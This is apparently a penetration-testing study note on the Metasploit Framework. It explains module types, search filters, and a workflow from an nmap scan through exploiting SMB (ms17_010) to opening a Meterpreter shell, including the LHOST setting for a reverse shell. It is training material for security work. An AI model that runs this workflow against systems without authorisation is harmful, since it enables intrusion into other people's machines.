### Metasploit Framework: Module Management and Exploitation

Metasploit modules are pre-configured scripts for specific functions, categorized to support different phases of an assessment. **Exploit modules** function as automated Proof-of-Concept (POC) tools; however, a module's failure does not necessarily disprove a vulnerability's existence, as target-specific customization is often required.

#### Module Structure and Types

Modules follow a standard naming convention: `<Index_No.> <type>/<os>/<service>/<name>`.

|Type|Function|Context/Usage|
|:--|:--|:--|
|**Auxiliary**|Scanning, fuzzing, sniffing, and administration.|Use for initial discovery and support tasks.|
|**Exploits**|Modules that leverage a vulnerability to deliver a payload.|Use to gain initial access to a target.|
|**Post**|Information gathering and pivoting.|Use after a session is established to deepen access.|
|**Payloads**|Remote code that establishes the connection back to the attacker.|Delivered by exploits to provide shell access.|
|**Encoders**|Ensures payload integrity during transit.|Use to maintain payload functionality.|
|**NOPs**|(No Operation) maintains consistent payload sizes.|Use to stabilize exploit attempts.|

---

#### Module Discovery and Search

The `search` function allows for rapid filtering of the Metasploit database using specific tags.

**Search Syntax:** `search [<options>] [<keywords>:<value>]`

|Keyword|Purpose|
|:--|:--|
|`type:`|Filters by module category (e.g., `exploit`, `auxiliary`, `post`).|
|`platform:`|Filters by the target operating system (e.g., `windows`, `linux`).|
|`cve:`|Searches for modules matching a specific CVE ID year or number.|
|`rank:`|Filters by reliability (e.g., `excellent`, `normal`).|
|`name:`|Searches the descriptive name of the module.|
|`path:`|Searches based on the module's file path.|

**Operational Search Examples:**

- Filter for specific Windows exploits from a known year: `search type:exploit platform:windows cve:<YEAR> rank:excellent <KEYWORD>`
- Reverse sort results by type: `search <STRING> -s type -r`

---

#### Operational Workflow: From Discovery to Shell

Follow these steps to select, configure, and execute a module against a target.

1. **Identify Vulnerable Services:** Use external tools like `nmap` to find open ports and service versions (e.g., SMB on port 445).
2. **Search for Relevant Modules:** Search MSF for the service or vulnerability (e.g., `search ms17_010`).
3. **Select the Module:** Load the module using its name or index number. **Note:** Only Auxiliary, Exploit, and Post modules can be "interactable" initiators.
    
    ```
    use <INDEX_OR_PATH>
    ```
    
4. **Review Module Details:** Check the `info` and `options` to understand requirements and behavior.
    
    ```
    info
    show options
    ```
    
5. **Configure Required Parameters:** Set the target and attack machine variables. Variables marked **Required: Yes** must be populated.
    - Use `set` for session-specific variables.
    - Use `setg` (global) to keep settings persistent across different modules during the same session.
6. **Execute the Attack:** Launch the module to attempt exploitation.
    
    ```
    run
    ```
    
7. **Interact with the Session:** Once a shell is established, use the `shell` command to transition from a Meterpreter prompt to a standard system command prompt.

---

#### Command Reference

| Command                  | Goal                                                                   |
| :----------------------- | :--------------------------------------------------------------------- |
| `use <INDEX>`            | Loads a module for use.                                                |
| `show options`           | Lists all configurable parameters and identifies required fields.      |
| `set RHOSTS <TARGET_IP>` | Defines the remote target(s).                                          |
| `set RPORT <PORT>`       | Defines the target service port.                                       |
| `set LHOST <ATTACK_IP>`  | Sets the local IP for the reverse shell to connect back to.            |
| `setg <VAR> <VALUE>`     | Sets a global variable that persists across different modules.         |
| `info`                   | Displays module platform, architecture, rank, and descriptive summary. |
| `run`                    | Initiates the exploit or auxiliary module.                             |
| `shell`                  | Opens a standard system shell from a Meterpreter session.              |